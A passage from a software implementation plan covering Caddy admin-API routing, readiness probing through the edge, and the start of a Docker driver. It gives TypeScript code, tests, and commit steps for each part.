`const stale = false`.

Expected: **FAIL** on *"WARNS rather than blocks once the database is older than 7
days"* **and** on *"marks a CLEAN scan from a stale database as stale too"*. The first
is the C1 half; the second is the "never mistaken for clean" half. Restore.

- [ ] **Step 8: Commit**

```bash
git add packages/control-plane/src/build/scan.ts packages/control-plane/src/build/scan.test.ts \
        packages/control-plane/src/build/scan.docker.test.ts \
        infra/images.txt infra/seed/seed.sh infra/scanner/ scripts/doctor.sh
git commit -m "feat(build): SBOM and vulnerability scanning, stale-warns-never-blocks

Syft v1.51.1 and Grype v0.118.0. A clean scan from a stale database is still
recorded as stale, so it cannot be read as evidence of nothing to find."
```

---

## Task 13: `routing/` — §23 hostnames, listener assignment, and Caddy's admin API

**Files:**
- Create: `packages/control-plane/src/routing/hostnames.ts`
- Create: `packages/control-plane/src/routing/caddy.ts`
- Create: `packages/control-plane/src/routing/routes.ts`
- Create: `packages/control-plane/src/routing/index.ts`
- Modify: `packages/control-plane/src/config.ts` (`caddyAdminUrl`, `caddyServers`)
- Test: `packages/control-plane/src/routing/hostnames.test.ts`
- Test: `packages/control-plane/src/routing/caddy.test.ts`
- Test: `packages/control-plane/src/routing/routes.docker.test.ts`

**Interfaces:**
- Consumes: `Config`, `hostnameFor`, `zoneFor` (P2 Task 12).
- Produces:
  - `type Listener = 'internal' | 'public'`
  - `listenerFor(kind: EnvironmentKind): Listener`
  - `routeIdFor(hostname: string): string`
  - `interface CaddyClient { getRoutes(server); putRoute(server, route); deleteRoute(server, id); listServers() }`
  - `createCaddyClient(adminUrl: string): CaddyClient`
  - `buildRoute(input: { hostname; upstream; routeId }): CaddyRoute`
  - `applyRoute(deps, input): Promise<void>`
  - `removeRoute(deps, hostname, listener): Promise<void>`
  - `reapplyAllRoutes(deps, routes): Promise<void>`

**Three things S1 and S7 paid for, and none is guessable from Caddy's docs:**

1. **`PUT` on `…/routes/0` inserts; `POST` appends.** Appending lands the route *behind* the wildcard whose `terminal: true` then swallows it, so the app is unreachable while the admin API reports success. Carried from S7 into S1 and now into code.
2. **Restarting the edge discards every runtime route.** They live only in the running config. S1 lost a live app's route by restarting Caddy. The control plane re-applies all routes on edge start — `reapplyAllRoutes` — and Task 19 adds the check that would have caught it.
3. **Route changes are safe under load.** S1 measured **0 failures in 400 requests across 12 add/remove cycles**, so there is no drain-and-swap dance to build.

**Listener assignment, not IP allowlisting (§12).** Sandbox and staging go on the
internal listener, production on the public one — *"a misconfigured allowlist leaks
quietly, whereas a route bound to the wrong listener is simply unreachable."* On the
laptop **both listeners are loopback** and both server names default to `srv0`
(§21's honest divergence 2), so the distinction is modelled and recorded here but is
not enforced locally. Configuring it as two settings rather than deriving it is what
lets UBC infrastructure enforce it without a code change.

**Route ids, so removal does not depend on an index.** S1 removed routes by index
(`DELETE …/routes/<index>`), which is correct exactly once — every later removal has
to re-read the array and recompute, and two concurrent removals race. Caddy's
`@id` field lets a route be addressed directly at `/id/<route-id>`, so this module
gives every route a deterministic id derived from its hostname.

- [ ] **Step 1: Write the failing unit tests**

`packages/control-plane/src/routing/hostnames.test.ts`:

```ts
import { describe, expect, it } from 'vitest'
import { listenerFor, routeIdFor } from './hostnames.js'
import { hostnameFor, loadConfig } from '../config.js'

const config = loadConfig({
  MANIFEST_ENV: 'development',
  MANIFEST_DATABASE_URL: 'postgres://m:m@127.0.0.1:7103/m',
  MANIFEST_SESSION_SECRET: 'x'.repeat(32),
  MANIFEST_BLUEPRINTS_ROOT: '/tmp/b',
  MANIFEST_REPOS_ROOT: '/tmp/r',
})

describe('§23 hostname derivation', () => {
  // The environment kind is carried by the ZONE, never by a suffix on the label.
  // A suffix scheme is squattable: `chem-labs-staging` is itself a legal slug.
  it('puts the environment kind in the zone, never in the label', () => {
    expect(hostnameFor(config, 'sandbox', 'chem-labs')).toBe('chem-labs.sandbox.manifest.internal')
    expect(hostnameFor(config, 'staging', 'chem-labs')).toBe('chem-labs.staging.manifest.internal')
    expect(hostnameFor(config, 'production', 'chem-labs')).toBe('chem-labs.manifest.internal')
  })

  it('makes a project named chem-labs-staging distinct from chem-labs staging', () => {
    expect(hostnameFor(config, 'production', 'chem-labs-staging')).not.toBe(
      hostnameFor(config, 'staging', 'chem-labs'),
    )
  })
})

describe('listener assignment (§12)', () => {
  it('binds sandbox and staging internal, production public', () => {
    expect(listenerFor('sandbox')).toBe('internal')
    expect(listenerFor('staging')).toBe('internal')
    expect(listenerFor('production')).toBe('public')
  })
})

describe('route ids', () => {
  it('derives a stable, Caddy-safe id from the hostname', () => {
    expect(routeIdFor('chem-labs.staging.manifest.internal')).toBe(
      'mf-chem-labs-staging-manifest-internal',
    )
    expect(routeIdFor('a.b')).toBe(routeIdFor('a.b'))
  })
})
```

`packages/control-plane/src/routing/caddy.test.ts` — a stand-in admin API, no Docker:

```ts
import { createServer, type Server } from 'node:http'
import { afterEach, describe, expect, it } from 'vitest'
import { buildRoute, createCaddyClient } from './caddy.js'

let server: Server | undefined
afterEach(() => server?.close())

function fakeAdmin(): Promise<{ url: string; seen: { method: string; path: string }[] }> {
  const seen: { method: string; path: string }[] = []
  server = createServer((req, res) => {
    seen.push({ method: req.method ?? '', path: req.url ?? '' })
    res.writeHead(200, { 'content-type': 'application/json' })
    res.end('[]')
  })
  return new Promise((resolve) =>
    server!.listen(0, '127.0.0.1', () => {
      const address = server!.address()
      const port = typeof address === 'object' && address ? address.port : 0
      resolve({ url: `http://127.0.0.1:${port}`, seen })
    }),
  )
}

describe('the Caddy route shape', () => {
  const route = buildRoute({
    hostname: 'chem-labs.staging.manifest.internal',
    upstream: 'mf-chem-labs-staging-abcdef12-app:3000',
    routeId: 'mf-chem-labs-staging-manifest-internal',
  })

  it('matches on the host, proxies to the upstream, and terminates', () => {
    expect(route['@id']).toBe('mf-chem-labs-staging-manifest-internal')
    expect(route.match).toEqual([{ host: ['chem-labs.staging.manifest.internal'] }])
    expect(route.terminal).toBe(true)
    const proxy = route.handle.at(-1) as { handler: string; upstreams: { dial: string }[] }
    expect(proxy.handler).toBe('reverse_proxy')
    expect(proxy.upstreams[0].dial).toBe('mf-chem-labs-staging-abcdef12-app:3000')
  })

  // §20: the edge protections apply ON EVERY ROUTE, and a Caddyfile site block does
  // NOT reach a route inserted through the admin API. Without this assertion every
  // app this driver deploys silently loses "the highest-leverage control in the
  // platform" while the route works perfectly.
  it('puts §20\'s edge protections AHEAD of the proxy on every route', () => {
    const handlers = route.handle.map((h) => (h as { handler: string }).handler)
    expect(handlers).toEqual(['request_body', 'rate_limit', 'headers', 'reverse_proxy'])
    const headers = route.handle[2] as { response: { set: Record<string, string[]> } }
    expect(Object.keys(headers.response.set).sort()).toEqual([
      'Content-Security-Policy', 'Referrer-Policy',
      'Strict-Transport-Security', 'X-Content-Type-Options',
    ])
  })
})

describe('the Caddy admin client', () => {
  // PUT INSERTS at index 0; POST APPENDS, which lands the route BEHIND the wildcard
  // whose terminal:true then swallows it — the admin API reports success and the
  // app is unreachable. S7 found it, S1 hit it again.
  it('uses PUT on routes/0, never POST', async () => {
    const { url, seen } = await fakeAdmin()
    await createCaddyClient(url).putRoute(
      'srv0',
      buildRoute({ hostname: 'a.b', upstream: 'c:1', routeId: 'r1' }),
    )
    expect(seen[0].method).toBe('PUT')
    expect(seen[0].path).toBe('/config/apps/http/servers/srv0/routes/0')
  })

  // Removal by @id, not by index: index-based removal is correct exactly once and
  // races with any concurrent change.
  it('deletes by @id rather than by array index', async () => {
    const { url, seen } = await fakeAdmin()
    await createCaddyClient(url).deleteRoute('srv0', 'r1')
    expect(seen[0].method).toBe('DELETE')
    expect(seen[0].path).toBe('/id/r1')
  })
})
```

- [ ] **Step 2: Run them to make sure they fail**

```bash
pnpm --filter @manifest/control-plane test src/routing/
```

Expected: FAIL — `Cannot find module './hostnames.js'`.

- [ ] **Step 3: Write the routing module**

`packages/control-plane/src/routing/hostnames.ts`:

```ts
// NOT redefined here. A second copy of this union is a second thing to keep in
// step with `InstanceSpec`, and the drift would be silent.
import type { InstanceSpec } from '../runtime/index.js'

export type EnvironmentKind = InstanceSpec['environmentKind']
export type Listener = 'internal' | 'public'

/**
 * §12: "The staging-is-UBC-only requirement is met by listener assignment, not IP
 * allowlisting: a misconfigured allowlist leaks quietly, whereas a route bound to
 * the wrong listener is simply unreachable."
 *
 * On the laptop both listeners are loopback and both server names default to the
 * same Caddy server (§21, honest divergence 2), so this distinction is modelled and
 * recorded rather than enforced locally. It is two settings, not a derivation, so
 * UBC infrastructure enforces it by configuration and not by a code change.
 */
export function listenerFor(kind: EnvironmentKind): Listener {
  return kind === 'production' ? 'public' : 'internal'
}

/** Caddy's `@id` namespace is flat, so the id carries the whole hostname. */
export function routeIdFor(hostname: string): string {
  return `mf-${hostname.replace(/\./g, '-')}`
}
```

`packages/control-plane/src/routing/caddy.ts`:

```ts
export interface CaddyRoute {
  '@id': string
  match: { host: string[] }[]
  handle: unknown[]
  terminal: boolean
}

/**
 * §20: "Application code is untrusted, so baseline protections live where an app
 * cannot remove them. Caddy applies, ON EVERY ROUTE: security headers, per-app and
 * per-IP rate limits, request body size caps."
 *
 * A Caddyfile's site block does NOT apply to a route inserted through the admin
 * API, so a route whose handler chain is `reverse_proxy` alone gets none of them —
 * and every app this driver deploys arrives that way. The protections are part of
 * the chain, ahead of the proxy, for exactly that reason.
 */
export function buildRoute(input: {
  hostname: string
  upstream: string
  routeId: string
  /** Requests per minute, per client IP. §20's "per-app and per-IP rate limits". */
  rateLimit?: number
  /** §20's "request body size caps". */
  maxBodyBytes?: number
}): CaddyRoute {
  return {
    '@id': input.routeId,
    match: [{ host: [input.hostname] }],
    handle: [
      { handler: 'request_body', max_size: input.maxBodyBytes ?? 10_485_760 },
      {
        handler: 'rate_limit',
        rate_limits: {
          [input.routeId]: {
            match: [{ remote_ip: { ranges: ['0.0.0.0/0', '::/0'] } }],
            key: '{http.request.remote.host}',
            window: '1m',
            max_events: input.rateLimit ?? 600,
          },
        },
      },
      {
        handler: 'headers',
        response: {
          set: {
            'Strict-Transport-Security': ['max-age=31536000; includeSubDomains'],
            'X-Content-Type-Options': ['nosniff'],
            'Referrer-Policy': ['strict-origin-when-cross-origin'],
            'Content-Security-Policy': ["frame-ancestors 'self'"],
          },
        },
      },
      { handler: 'reverse_proxy', upstreams: [{ dial: input.upstream }] },
    ],
    // terminal:true stops the wildcard behind this route from also matching.
    terminal: true,
  }
}

export interface CaddyClient {
  listServers(): Promise<Record<string, unknown>>
  getRoutes(server: string): Promise<CaddyRoute[]>
  putRoute(server: string, route: CaddyRoute): Promise<void>
  deleteRoute(server: string, routeId: string): Promise<void>
}

export function createCaddyClient(adminUrl: string): CaddyClient {
  const call = async (method: string, path: string, body?: unknown): Promise<Response> => {
    const response = await fetch(`${adminUrl}${path}`, {
      method,
      headers: body === undefined ? {} : { 'content-type': 'application/json' },
      body: body === undefined ? undefined : JSON.stringify(body),
    })
    if (!response.ok && response.status !== 404) {
      throw new Error(`caddy admin ${method} ${path} failed (${response.status}): ${await response.text()}`)
    }
    return response
  }

  return {
    async listServers() {
      return (await (await call('GET', '/config/apps/http/servers')).json()) as Record<string, unknown>
    },
    async getRoutes(server) {
      const response = await call('GET', `/config/apps/http/servers/${server}/routes`)
      return response.status === 404 ? [] : ((await response.json()) as CaddyRoute[]) ?? []
    },
    async putRoute(server, route) {
      // PUT INSERTS at index 0. POST APPENDS, and an appended route lands behind
      // the wildcard whose terminal:true swallows it — success from the API, an
      // unreachable app in the browser. This is the single most expensive
      // one-character mistake available in this file.
      await call('PUT', `/config/apps/http/servers/${server}/routes/0`, route)
    },
    async deleteRoute(_server, routeId) {
      // By @id. Index-based removal is correct exactly once, and two concurrent
      // removals race on an array that shifted underneath them.
      await call('DELETE', `/id/${routeId}`)
    },
  }
}
```

`packages/control-plane/src/routing/routes.ts`:

```ts
import { type CaddyClient, buildRoute } from './caddy.js'
import { type EnvironmentKind, type Listener, listenerFor, routeIdFor } from './hostnames.js'

export interface RoutingDeps {
  caddy: CaddyClient
  /** Listener -> Caddy server name. Both are `srv0` on the laptop (§21). */
  servers: Record<Listener, string>
}

export interface RouteSpec {
  hostname: string
  upstream: string
  kind: EnvironmentKind
}

export async function applyRoute(deps: RoutingDeps, spec: RouteSpec): Promise<void> {
  const server = deps.servers[listenerFor(spec.kind)]
  const routeId = routeIdFor(spec.hostname)
  // Idempotent: replacing means removing first, because a second PUT at index 0
  // would leave two routes matching the same host and the older one shadowed.
  await deps.caddy.deleteRoute(server, routeId).catch(() => undefined)
  await deps.caddy.putRoute(server, buildRoute({ ...spec, routeId }))
}

export async function removeRoute(
  deps: RoutingDeps,
  hostname: string,
  kind: EnvironmentKind,
): Promise<void> {
  await deps.caddy.deleteRoute(deps.servers[listenerFor(kind)], routeIdFor(hostname))
}

/**
 * S1: "recreating the Caddy container discards every runtime route", because they
 * live only in the running config. §12 now says the control plane re-applies all
 * routes on edge start. This is that function; Task 19 adds the check that would
 * have caught the original loss.
 */
export async function reapplyAllRoutes(deps: RoutingDeps, specs: RouteSpec[]): Promise<void> {
  for (const spec of specs) await applyRoute(deps, spec)
}
```

- [ ] **Step 4: Write the Docker-tier test**

`packages/control-plane/src/routing/routes.docker.test.ts`:

```ts
import { execFile } from 'node:child_process'
import { promisify } from 'node:util'
import { afterAll, expect, it } from 'vitest'
import { describeDocker } from '../runtime/docker/docker-tier.js'
import { createCaddyClient } from './caddy.js'
import { applyRoute, reapplyAllRoutes, removeRoute } from './routes.js'

const run = promisify(execFile)
const caddy = createCaddyClient('http://127.0.0.1:7119')
const deps = { caddy, servers: { internal: 'srv0', public: 'srv0' } }
const HOST = 'routetest.staging.manifest.internal'

/** Through the edge, from a CONTAINER: a host process cannot reach container IPs. */
const curlFromContainer = async (url: string): Promise<string> =>
  (
    await run('docker', [
      'run', '--rm', '--network', 'manifest-platform', '--dns', '10.89.0.53',
      'curlimages/curl:8.11.1', '-sS', '-m', '8', '-o', '/dev/null',
      '-w', '%{http_code}', url,
    ])
  ).stdout.trim()

describeDocker('runtime routing through the Caddy admin API', () => {
  afterAll(async () => {
    await removeRoute(deps, HOST, 'staging')
    await run('docker', ['rm', '-f', 'mf-routetest-staging-app']).catch(() => undefined)
  })

  it('routes a hostname to a container after boot', async () => {
    await run('docker', ['rm', '-f', 'mf-routetest-staging-app']).catch(() => undefined)
    await run('docker', [
      'run', '-d', '--name', 'mf-routetest-staging-app', '--network', 'manifest-platform',
      'alpine:3.22', 'sh', '-c',
      'while true; do printf "HTTP/1.1 200 OK\\r\\nContent-Length: 2\\r\\n\\r\\nok" | nc -l -p 8080; done',
    ])
    await applyRoute(deps, { hostname: HOST, upstream: 'mf-routetest-staging-app:8080', kind: 'staging' })
    expect(await curlFromContainer(`http://${HOST}/`)).toBe('200')
  })

  it('is idempotent — applying twice leaves ONE route for the host', async () => {
    await applyRoute(deps, { hostname: HOST, upstream: 'mf-routetest-staging-app:8080', kind: 'staging' })
    const routes = await caddy.getRoutes('srv0')
    expect(routes.filter((r) => r.match?.[0]?.host?.includes(HOST))).toHaveLength(1)
  })

  it('removes the route by id, and the host stops resolving to the app', async () => {
    await removeRoute(deps, HOST, 'staging')
    expect(await curlFromContainer(`http://${HOST}/`)).not.toBe('200')
  })

  // S1's lost route, as a test. This is the property §12 gained a sentence for.
  it('re-applies every route after the edge is restarted', async () => {
    const specs = [{ hostname: HOST, upstream: 'mf-routetest-staging-app:8080', kind: 'staging' as const }]
    await reapplyAllRoutes(deps, specs)
    expect(await curlFromContainer(`http://${HOST}/`)).toBe('200')

    await run('docker', ['restart', 'manifest-caddy'])
    await new Promise((r) => setTimeout(r, 4000))
    // The route is GONE, and this assertion is the finding rather than a bug.
    expect(await curlFromContainer(`http://${HOST}/`)).not.toBe('200')

    await reapplyAllRoutes(deps, specs)
    expect(await curlFromContainer(`http://${HOST}/`)).toBe('200')
  })
})
```

- [ ] **Step 5: Run both tiers**

```bash
pnpm test && pnpm test:docker
```

Expected: 6 unit tests, 4 Docker tests. The last one restarts Caddy, so it is slow;
that is why the Docker project's `testTimeout` is 120 s.

- [ ] **Step 6: Prove `PUT` is what makes the route reachable**

In `putRoute`, change `PUT` to `POST` and the path to
`/config/apps/http/servers/${server}/routes`.

Expected: **FAIL** on *"routes a hostname to a container after boot"* — the admin API
returns 200, the route exists in the config, and the request still does not reach the
app, because it landed behind the wildcard. Restore.

**This is the failure that looks like a DNS problem and is not.** Having seen it fail
once, in this exact shape, is worth more than the comment above `putRoute`.

- [ ] **Step 7: Commit**

```bash
git add packages/control-plane/src/routing/
git commit -m "feat(routing): §23 hostnames, listener assignment, and the Caddy admin API

PUT inserts at index 0; POST appends behind the wildcard and the app is silently
unreachable. Routes are addressed by @id so removal does not race an index.
reapplyAllRoutes covers the routes an edge restart discards."
```

---

## Task 14: Readiness through the edge

**Files:**
- Create: `packages/control-plane/src/routing/readiness.ts`
- Modify: `packages/control-plane/src/routing/index.ts`
- Test: `packages/control-plane/src/routing/readiness.test.ts`

**Interfaces:**
- Consumes: nothing at runtime — it takes a `probe` function, which is what makes it testable without Docker.
- Produces:
  - `interface ReadinessResult { ready: boolean; attempts: number; lastStatus?: number; reason: string }`
  - `waitForReady(input: { url; probe; timeoutMs; intervalMs }): Promise<ReadinessResult>`
  - `edgeProbe(engine, hostname, healthPath): () => Promise<number>`

**This is its own task because the obvious implementation is wrong and looks right.**
The control plane is a **host process** (§21) and S1 measured
`host -> 10.89.0.2:8080 = UNREACHABLE`: on Docker Desktop a host process cannot reach
a container IP. A readiness poll written against `InstanceHandle` and the container's
address works on Linux, fails on every developer's Mac, and fails as a timeout rather
than as an error — so it reads as "the app is slow to start".

**And it is a different question from `status().healthy`.** Task 7 reads Docker's own
`HEALTHCHECK`, which runs *inside* the container and says the process is up. This says
**the app is reachable at its hostname** — which additionally requires DNS, a Caddy
route, and the right listener. An instance can be `healthy` and unreachable; §11's
`starting → healthy` transition should mean the second thing, because that is what a
faculty member will check.

**So the probe runs from a container**, through the edge, using the platform's own
resolver — the same path S1 used to prove byte-identical reachability from host and
container.

- [ ] **Step 1: Write the failing test**

`packages/control-plane/src/routing/readiness.test.ts`:

```ts
import { describe, expect, it, vi } from 'vitest'
import { waitForReady } from './readiness.js'

describe('readiness polling', () => {
  it('returns ready on the first 200', async () => {
    const probe = vi.fn(async () => 200)
    const result = await waitForReady({ url: 'https://x/', probe, timeoutMs: 1000, intervalMs: 10 })
    expect(result.ready).toBe(true)
    expect(result.attempts).toBe(1)
  })

  it('keeps trying while the edge answers 502, and succeeds when the app comes up', async () => {
    let calls = 0
    const probe = async () => (++calls < 3 ? 502 : 200)
    const result = await waitForReady({ url: 'https://x/', probe, timeoutMs: 2000, intervalMs: 5 })
    expect(result.ready).toBe(true)
    expect(result.attempts).toBe(3)
  })

  it('gives up at the timeout and says what it last saw', async () => {
    const result = await waitForReady({
      url: 'https://x/', probe: async () => 502, timeoutMs: 60, intervalMs: 10,
    })
    expect(result.ready).toBe(false)
    expect(result.lastStatus).toBe(502)
    expect(result.reason).toContain('502')
  })

  // A probe that throws is a probe that could not run — DNS not resolving, the
  // edge not listening. It must not be mistaken for "the app said no".
  it('treats a throwing probe as not-ready and reports the error, not a status', async () => {
    const result = await waitForReady({
      url: 'https://x/',
      probe: async () => {
        throw new Error('could not resolve host')
      },
      timeoutMs: 60,
      intervalMs: 10,
    })
    expect(result.ready).toBe(false)
    expect(result.lastStatus).toBeUndefined()
    expect(result.reason).toContain('could not resolve host')
  })

  // 200 is the ONLY ready state. A 3xx from the edge means the app is redirecting
  // its health path somewhere — an app that answers 302 to /healthz is not healthy,
  // it is misconfigured, and accepting it here hides that until a faculty member
  // finds it.
  it('does not accept a redirect as ready', async () => {
    const result = await waitForReady({
      url: 'https://x/', probe: async () => 302, timeoutMs: 60, intervalMs: 10,
    })
    expect(result.ready).toBe(false)
  })
})
```

- [ ] **Step 2: Run it to make sure it fails**

```bash
pnpm --filter @manifest/control-plane test src/routing/readiness
```

Expected: FAIL — `Cannot find module './readiness.js'`.

- [ ] **Step 3: Write it**

`packages/control-plane/src/routing/readiness.ts`:

```ts
import type { EngineClient } from '../runtime/index.js'

export interface ReadinessResult {
  ready: boolean
  attempts: number
  lastStatus?: number
  reason: string
}

export async function waitForReady(input: {
  url: string
  probe: () => Promise<number>
  timeoutMs: number
  intervalMs: number
}): Promise<ReadinessResult> {
  const deadline = Date.now() + input.timeoutMs
  let attempts = 0
  let lastStatus: number | undefined
  let lastError: string | undefined

  for (;;) {
    attempts += 1
    try {
      lastStatus = await input.probe()
      lastError = undefined
      // 200 only. A 302 to a login page is an app that is running and wrong, and
      // accepting it here defers the discovery to a faculty member.
      if (lastStatus === 200) {
        return { ready: true, attempts, lastStatus, reason: 'the edge served 200' }
      }
    } catch (error) {
      lastStatus = undefined
      lastError = (error as Error).message
    }
    if (Date.now() >= deadline) {
      return {
        ready: false,
        attempts,
        lastStatus,
        reason:
          lastError !== undefined
            ? `the probe could not run: ${lastError}`
            : `the edge last answered ${lastStatus} after ${attempts} attempt(s)`,
      }
    }
    await new Promise((resolve) => setTimeout(resolve, input.intervalMs))
  }
}

/**
 * Runs the probe FROM A CONTAINER, through the edge, with the platform resolver.
 *
 * The control plane is a host process (§21) and S1 measured
 * `host -> 10.89.0.2:8080 = UNREACHABLE` — a host process cannot reach a container
 * IP on Docker Desktop. Probing the container address works on Linux, fails on
 * every Mac, and fails as a TIMEOUT, so it reads as a slow-starting app.
 *
 * This also asks a different question from `status().healthy`, which reads Docker's
 * in-container HEALTHCHECK: this one additionally proves DNS, the Caddy route and
 * the listener, which is what "reachable" means to the person who asked for the app.
 */
export function edgeProbe(
  engine: EngineClient,
  hostname: string,
  healthPath: string,
): () => Promise<number> {
  return async () => {
    const created = await engine.post<{ Id: string }>('/containers/create', {
      Image: 'curlimages/curl:8.11.1',
      Cmd: ['-sS', '-m', '5', '-o', '/dev/null', '-w', '%{http_code}', `https://${hostname}${healthPath}`],
      HostConfig: { NetworkMode: 'manifest-platform', Dns: ['10.89.0.53'] },
    })
    const id = created!.Id
    try {
      await engine.post(`/containers/${id}/start`)
      await engine.post(`/containers/${id}/wait`)
      const logs = await engine.stream(`/containers/${id}/logs?stdout=true`)
      let text = ''
      for await (const chunk of logs as unknown as AsyncIterable<Buffer>) text += chunk.toString('utf8')
      const code = Number(text.replace(/[^0-9]/g, '').slice(-3))
      return Number.isNaN(code) ? 0 : code
    } finally {
      await engine.del(`/containers/${id}?force=true&v=true`)
    }
  }
}
```

- [ ] **Step 4: Run the tests**

```bash
pnpm test
```

Expected: PASS — 5 readiness tests, still with no Docker. `edgeProbe` is exercised in
Task 17's end-to-end run, where there is a real app to be ready.

- [ ] **Step 5: Prove the 200-only rule**

Change `if (lastStatus === 200)` to `if (lastStatus !== undefined && lastStatus < 400)`.

Expected: **FAIL** on *"does not accept a redirect as ready"*. Restore.

- [ ] **Step 6: Commit**

```bash
git add packages/control-plane/src/routing/readiness.ts packages/control-plane/src/routing/readiness.test.ts packages/control-plane/src/routing/index.ts
git commit -m "feat(routing): readiness through the edge, from a container

A host process cannot reach container IPs on Docker Desktop (S1), and reachability
at the hostname is a different claim from the container's own healthcheck."
```

---

## Task 15: The `DockerDriver`, assembled — and P2's contract suite, unchanged

**Files:**
- Create: `packages/control-plane/src/runtime/docker/driver.ts`
- Create: `packages/control-plane/src/runtime/docker/index.ts`
- Modify: `packages/control-plane/src/runtime/index.ts` (re-export `createDockerDriver`)
- Modify: `packages/control-plane/src/config.ts` (`dnsServer`, `masterSecret`, `dockerSocket`)
- Modify: `packages/control-plane/src/index.ts` (**the boot entry point — Step 6**)
- Test: `packages/control-plane/src/runtime/docker/driver.docker.test.ts`
- Test: `packages/control-plane/src/runtime/docker/capabilities.test.ts`

**Interfaces:**
- Consumes: every module from Tasks 1 through 14.
- Produces:
  - `interface DockerDriverOptions { engine; masterSecret; buildCredentialSecret; blueprintDir; dnsServer; registryHost; registryPublicHost; hostnameFor; routing; limits? }`
  - `createDockerDriver(options: DockerDriverOptions): Promise<Driver>`

**This is the task the plan exists for.** §16 calls the driver contract suite *"one
suite every driver must pass. The k8s driver later proves itself against the exact
tests the Docker driver passes — this is what keeps the abstraction honest rather
than aspirational."* The test file below is **four lines**, and its shortness is the
deliverable: everything it asserts was written in P2, against a fake, before this
driver existed.

**`driver-contract.ts` is imported unchanged.** If a contract test fails, the fix is
in this driver — or, if the interface is genuinely wrong, that is a finding to write
down and raise, not a licence to edit the suite. Editing it would convert a contract
into a description of whatever was built.

**`buildImage` is where the plan's parts meet**, and the order matters:

1. assemble the context (Task 11) — blueprint files written **after** the app tree
2. run the mandatory gates (Task 11) — secret scan and lockfile, offline-safe, blocking
3. take a build slot (Task 10) — per project and globally
4. create the ephemeral builder (Task 10), destroy it in a `finally`
5. issue a repository-scoped credential (Task 9) — `local/<slug>` only
6. build and push, take `containerimage.digest` from `--metadata-file` (Task 10)
7. scan the pushed image and record staleness (Task 12)

**`ImageRef.repository` is `local/<slug>`** — §13's namespace rule, which Task 16
then enforces at deploy time. The **builder** addresses the registry as
`manifest-registry:5000` and the **daemon** addresses it as `127.0.0.1:7107`; S1
established that this is fine precisely because the reference is a digest. A tag
would not have survived the name change, which is a small argument for §13's rule
arriving from an unexpected direction.

- [ ] **Step 1: Write the contract test — four lines**

`packages/control-plane/src/runtime/docker/driver.docker.test.ts`:

```ts
import { describeDriverContract } from '../driver-contract.js'
import { describeDocker } from './docker-tier.js'
import { createDockerDriver } from './driver.js'
import { dockerDriverForTests } from './testing.js'

// The identical suite the fake driver passes (§16). Not a copy, not a subset, and
// not edited: `driver-contract.ts` is imported exactly as P2 wrote it.
describeDocker('Docker driver', () => {
  describeDriverContract('docker', () => dockerDriverForTests())
})
```

Add `dockerDriverForTests()` to `runtime/docker/testing.ts` — it builds a driver
against the live daemon with a fixture blueprint and a throwaway project slug, and
registers an `afterAll` that removes every `mf-contract-*` container, network and
volume it created.

`packages/control-plane/src/runtime/docker/capabilities.test.ts`:

```ts
import { describe, expect, it } from 'vitest'
import type { DriverCapabilities } from '../driver.js'
import { REQUIRED_CAPABILITY_KEYS } from './hardening.js'
import { dockerCapabilities } from './driver.js'

describe('what this driver honestly reports', () => {
  it('reports every field the interface declares — no omissions', () => {
    const caps = dockerCapabilities({ userns: false, diskQuota: false })
    expect(Object.keys(caps).sort()).toEqual(Object.keys(REQUIRED_CAPABILITY_KEYS).sort())
  })

  // §11 and §21 divergence 6. `container` is the weakest level, and saying so is
  // what lets sandboxes be upgraded to a stronger runtime later without redesign.
  it('reports the weakest isolation level, because that is what a container is', () => {
    expect(dockerCapabilities({ userns: false, diskQuota: false }).isolationLevel).toBe('container')
  })

  it('passes the daemon\'s answers through rather than asserting them', () => {
    expect(dockerCapabilities({ userns: true, diskQuota: true })).toMatchObject({
      enforcesUserNamespaceRemapping: true,
      enforcesDiskQuota: true,
    })
    expect(dockerCapabilities({ userns: false, diskQuota: false })).toMatchObject({
      enforcesUserNamespaceRemapping: false,
      enforcesDiskQuota: false,
    })
  })

  // §13's promotion rule reads this. A local driver must never claim a remote target.
  it('is not a remote target', () => {
    expect(dockerCapabilities({ userns: false, diskQuota: false }).remoteTarget).toBe(false)
  })

  it('enforces egress, because §12\'s forced proxy and internal network do', () => {
    expect(dockerCapabilities({ userns: false, diskQuota: false }).enforcesEgress).toBe(true)
  })
})
```

- [ ] **Step 2: Run them to make sure they fail**

```bash
pnpm test && pnpm test:docker
```

Expected: FAIL — `Cannot find module './driver.js'`.

- [ ] **Step 3: Write the driver**

`packages/control-plane/src/runtime/docker/driver.ts`:

```ts
import { mkdtemp } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type {
  Driver, DriverCapabilities, ExecOpts, ExecStream, ImageRef, InstanceHandle, InstanceSpec,
  InstanceStatus, LogLine, LogOpts, ServiceBinding, ServiceHandle, SnapshotRef, SourceRef,
} from '../driver.js'
import { BuildGateError, assembleContext, runMandatoryGates, scanImage } from '../../build/index.js'
import { applyRoute, type RoutingDeps } from '../../routing/index.js'
import { DEFAULT_BUILD_LIMITS, type BuildLimits, runBuildxBuild, withEphemeralBuilder } from './builder.js'
import { createBuildQueue } from './concurrency.js'
import { ensureEgressProxy } from './egress.js'
import { EngineError, type EngineClient } from './engine.js'
import { containerExec } from './exec.js'
import { detectHostCapabilities } from './hardening.js'
import {
  destroyInstanceContainer, ensureInstanceContainer, instanceStatus, stopInstanceContainer,
} from './instances.js'
import { containerLogs } from './logs.js'
import { appNetwork } from './names.js'
import { ensureAppNetwork } from './networks.js'
import { issueBuildCredential } from './registry-auth.js'
import { destroyServiceContainer, ensureServiceContainer } from './services.js'

export function dockerCapabilities(host: { userns: boolean; diskQuota: boolean }): DriverCapabilities {
  return {
    // §12's internal network plus the forced per-app proxy. Task 4 and Task 5 each
    // carry a negative control showing the denial is real.
    enforcesEgress: true,
    // §21, divergence 6: the weakest level. S6 (Task 18) is what decides whether it
    // is acceptable for sandboxes, and saying `container` is what makes that a
    // decision rather than a discovery.
    isolationLevel: 'container',
    remoteTarget: false,
    supportsExec: true,
    // §12's nightly production snapshots are a Phase 2 job; the operation is not
    // implemented, and claiming it would be worse than not having it.
    supportsSnapshot: false,
    enforcesUserNamespaceRemapping: host.userns,
    enforcesDiskQuota: host.diskQuota,
  }
}

export interface DockerDriverOptions {
  engine: EngineClient
  masterSecret: string
  buildCredentialSecret: string
  blueprintDir: string
  /** dnsmasq-A's platform-network address. §12 makes the resolver per-container. */
  dnsServer: string
  /** What the BUILDER calls the registry. */
  registryHost: string
  /** What the DAEMON calls the registry. Different name, same content, by digest. */
  registryPublicHost: string
  hostnameFor: (kind: InstanceSpec['environmentKind'], slug: string) => string
